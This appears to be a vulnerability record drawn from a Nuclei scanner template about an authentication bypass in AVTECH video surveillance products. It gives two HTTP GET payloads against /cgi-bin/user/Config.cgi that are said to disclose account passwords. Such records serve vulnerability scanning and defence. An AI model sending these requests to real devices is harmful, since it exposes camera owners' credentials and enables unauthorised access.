# Vulnerability: AVTECH Video Surveillance Product - Authentication Bypass
**Classification:** EXPOSURE
**Source:** Nuclei Template (`avtech-auth-bypass.yaml`)

## Description
AVTECH Video Surveillance Products password disclosure through /cgi-bin/user/Config.cgi.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*
GET {{BaseURL}}/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*
```

